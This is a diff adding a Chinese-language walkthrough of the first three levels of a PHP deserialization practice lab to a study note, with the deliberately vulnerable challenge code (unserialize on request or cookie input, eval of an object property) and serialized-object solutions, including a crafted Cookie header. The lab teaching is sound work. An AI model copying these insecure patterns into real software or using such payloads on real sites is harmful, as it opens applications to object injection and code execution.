@@ -1322,3 +1322,159 @@ $phar->stopBuffering();
 成功构造`Phar`包后上传到服务器，再在`index.php`页面利用`Phar`伪协议访问包
 
 <img src="PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20230513201238477.png" alt="image-20230513201238477" style="zoom:50%;" />
+
+# PHP序列化漏洞闯关
+
+关卡源码下载地址：
+
+```
+https://github.com/fine-1/php-SER-libs
+```
+
+## 第一关
+
+分析：源码上`class a`已经自己调用了`action`方法，所以只需要做实例化就行了
+
+```php
+<?php
+highlight_file(__FILE__);
+class a{
+    var $act;
+    function action(){
+        eval($this->act);
+    }
+}
+$a=unserialize($_GET['flag']);
+$a->action();
+?>
+<br><a href="../level2">点击进入第二关</a>
+```
+
+wp：
+
+```php
+<?php
+
+class a{
+    var $act;
+    function action(){
+        eval($this->act);
+    }
+}
+$a = new a();
+echo serialize($a)
+
+?>
+```
+
+## 第二关
+
+分析：实例化`mylogin`类之后，自动调用`login方法`，只要`login方法`返回1，就能通关；
+
+```php
+<?php
+highlight_file(__FILE__);
+include("flag.php");
+class mylogin{
+    var $user;
+    var $pass;
+    function __construct($user,$pass){
+        $this->user=$user;
+        $this->pass=$pass;
+    }
+    function login(){
+        if ($this->user=="daydream" and $this->pass=="ok"){
+            return 1;
+        }
+    }
+}
+$a=unserialize($_GET['param']);
+if($a->login())
+{
+    echo $flag;
+}
+?> 
+```
+
+wp：
+
+```php
+<?php
+include("flag.php");
+class mylogin{
+    var $user;
+    var $pass;
+    function __construct($user,$pass){
+        $this->user=$user;
+        $this->pass=$pass;
+    }
+    function login(){
+        if ($this->user=="daydream" and $this->pass=="ok"){
+            return 1;
+        }
+    }
+}
+
+$my = new mylogin("daydream", "ok");
+echo serialize($my);
+```
+
+## 第三关
+
+注意看：第三关和第二关的区别是：第三关是通过cookie传值的，考的是cookie反序列化
+
+```php
+<?php
+highlight_file(__FILE__);
+include("flag.php");
+class mylogin{
+    var $user;
+    var $pass;
+    function __construct($user,$pass){
+        $this->user=$user;
+        $this->pass=$pass;
+    }
+    function login(){
+        if ($this->user=="daydream" and $this->pass=="ok"){
+            return 1;
+        }
+    }
+}
+$a=unserialize($_COOKIE['param']);
+if($a->login())
+{
+    echo $flag;
+}
+?> 
+```
+
+wp:
+
+```
+<?php
+highlight_file(__FILE__);
+include("flag.php");
+class mylogin{
+    var $user;
+    var $pass;
+    function __construct($user,$pass){
+        $this->user=$user;
+        $this->pass=$pass;
+    }
+    function login(){
+        if ($this->user=="daydream" and $this->pass=="ok"){
+            echo "Success";
+            return 1;
+        }
+    }
+}
+$a=unserialize($_COOKIE['param']);
+$a->login();
+```
+
+在HTTP request中添加如下字段：
+
+```
+Cookie: param=O%3a7%3a"mylogin"%3a2%3a{s%3a4%3a"user"%3bs%3a8%3a"daydream"%3bs%3a4%3a"pass"%3bs%3a2%3a"ok"%3b}
+```
+
